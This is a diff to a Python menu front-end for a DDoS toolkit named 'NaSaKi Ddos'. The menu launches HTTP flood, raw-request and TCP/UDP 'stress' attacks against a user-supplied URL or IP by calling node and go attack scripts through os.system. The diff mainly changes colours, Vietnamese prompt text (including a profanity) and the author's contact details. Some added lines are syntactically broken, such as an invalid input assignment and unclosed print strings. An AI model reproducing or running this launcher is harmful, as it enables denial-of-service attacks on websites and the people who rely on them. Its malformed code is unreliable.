@@ -24,7 +24,7 @@ def ascii_vro():
      ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  
      ▒ ░▒░ ░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░
      ░  ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ░
-     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   by TranDucDuy
+     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   Code By TranDucDuy
                                            """)
     time.sleep(1.8)
     clear()
@@ -32,7 +32,7 @@ def ascii_vro():
 def si():
     print("Zalo/Call: 0974998164")
     print("Information: https://tddcd.info")
-
+    print(Fore.BLUE + """
 def menu():
     sys.stdout.write(f"NaSaKi Ddos Update 4.5.8")
     clear()
@@ -65,7 +65,7 @@ def menu():
 def main():
     menu()
     while(True):
-        cnc = input('''Input :''')
+        cnc = Nhập Command ('''Nhập Command :''')
         if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             ()
         elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
@@ -92,8 +92,8 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
-                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
-                print(Fore.RED +'Example: http-socket http://TranDucDuy.info/ 5000 60')
+                print(Fore.BLUE +'Usage: http-socket <url> <per> <time>')
+                print(Fore.BLUE +'Example: http-socket http://TranDucDuy.info/ 5000 60')
 
         elif "http-raw" in cnc:
             try:
@@ -101,8 +101,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
-                print(Fore.RED +'Usage: http-raw <url> <time>')
-                print(Fore.RED +'Example: http-raw TranDucDuy.info/ 60')
+                print(Fore.BLUE +'Usage: http-raw <url> <time>')
+                print(Fore.BLUE +'Example: http-raw TranDucDuy.info/ 60')
 
         elif "http-requests" in cnc:
             try:
@@ -110,8 +110,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node HTTP-REQUESTS {url} {time}')
             except IndexError:
-                print(Fore.RED +'Usage: http-requests <url> <time>')
-                print(Fore.RED +'Example: http-requests http://TranDucDuy.info/ 60')
+                print(Fore.BLUE +'Usage: http-requests <url> <time>')
+                print(Fore.BLUE +'Example: http-requests http://TranDucDuy.info/ 60')
 
         elif "stress" in cnc:
             try:
@@ -125,7 +125,7 @@ def main():
             except IndexError:
                 print(Fore.BLUE +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                 print(Fore.BLUE +'MODE: [1] TCP')
-                print(Fore.WHITE +'      [2] UDP')
+                print(Fore.BLUE +'      [2] UDP')
                 print(Fore.BLUE +'      [3] HTTP')
                 print(Fore.BLUE +'Example: stress 1.1.1.1 80/443 3 1250 60 5')
 
@@ -135,8 +135,8 @@ def main():
                 time = cnc.split()[2]
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
-                print(Fore.RED +'Usage: http-rand <url> <time>')
-                print(Fore.RED +'Example: http-rand http://TranDucDuy.info/ 60')
+                print(Fore.BLUE +'Usage: http-rand <url> <time>')
+                print(Fore.BLUE +'Example: http-rand http://TranDucDuy.info/ 60')
 
         elif "sever" in cnc:
             try:
@@ -144,18 +144,19 @@ def main():
                 method = cnc.split()[2]
                 os.system(f'go run sever.go -site {url} -data {method}')
             except IndexError:
-                print(Fore.RED +'Usage: sever <url> METHODS<GET/POST>')
-                print(Fore.RED +'Example: sever http://TranDucDuy.info/ GET')
+                print(Fore.BLUE +'Usage: sever <url> METHODS<GET/POST>')
+                print(Fore.BLUE +'Example: sever http://TranDucDuy.info/ GET')
 
         elif "info" in cnc:
             print(f'''
-[https://TranDucDuy.info]
+            print(Fore.BLUE + """
+[Zalo : 0974998164 FB : Trần Đức Duy (19T) ]
 
             ''')
         else:
             try:
                 cmmnd = cnc.split()[0]
-                print("Command: [ " + cmmnd + " ] Not Found!")
+                print("Command: [ " + cmmnd + " ] Đéo Có Command Này")
             except IndexError:
                 pass
 main()
